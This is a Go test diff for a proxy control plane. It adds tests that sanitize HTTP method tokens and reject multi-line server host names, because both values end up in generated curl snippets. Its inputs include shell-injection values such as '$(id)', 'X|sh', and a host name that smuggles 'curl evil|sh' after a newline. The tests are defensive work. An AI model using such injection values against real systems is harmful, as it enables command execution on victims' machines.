@@ -3,6 +3,7 @@ package store
 import (
 	"strings"
 	"testing"
+	"time"
 
 	"aegisproxy/control-plane/internal/engine"
 	"aegisproxy/control-plane/internal/models"
@@ -66,5 +67,43 @@ func TestTeamLeadCannotWithdrawGuardrailsBySetChanges(t *testing.T) {
 	// InfoSec may still disable the set.
 	if _, err := st.SaveDraft(set.ID, disabled, adminClaims); err != nil {
 		t.Fatalf("InfoSec could not disable the set: %v", err)
+	}
+}
+
+// R3-2: the request method of a flow is copied into curl snippets of the console. HTTP allows shell
+// metacharacters in a method token, so only method-like values are stored.
+func TestFlowMethodIsSanitized(t *testing.T) {
+	for in, want := range map[string]string{
+		"":                   "",
+		"get":                "GET",
+		"PROPFIND":           "PROPFIND",
+		"VERSION-CONTROL":    "VERSION-CONTROL",
+		"M-SEARCH":           "M-SEARCH",
+		"GET`id`":            "INVALID",
+		"X|sh":               "INVALID",
+		"$(id)":              "INVALID",
+		"A&B":                "INVALID",
+		"GET'":               "INVALID",
+		"GET X":              "INVALID",
+		"-OUTPUT":            "INVALID",
+		"GÉT":                "INVALID",
+		"AVERYLONGMETHODXYZ": "INVALID",
+	} {
+		if got := sanitizeFlow(models.TrafficFlow{ID: "flw-1", Method: in}, time.Now(), 0, "").Method; got != want {
+			t.Errorf("method %q stored as %q, want %q", in, got, want)
+		}
+	}
+}
+
+// R3-2: server host names end up in one-line contexts (snippet comments, audit summaries).
+func TestServerHostnameMustBeOneLine(t *testing.T) {
+	st := newTestStore(t, t.TempDir(), false)
+	for _, h := range []string{"web-1\ncurl evil|sh", "web-1\tx", "web-1\rx"} {
+		if _, err := st.UpsertServer(models.Server{ID: "srv-nl", Hostname: h, IP: "10.7.0.9"}, adminClaims); err == nil {
+			t.Errorf("hostname %q accepted", h)
+		}
+	}
+	if _, err := st.UpsertServer(models.Server{ID: "srv-nl", Hostname: "web-1.corp.example", IP: "10.7.0.9"}, adminClaims); err != nil {
+		t.Fatal(err)
 	}
 }
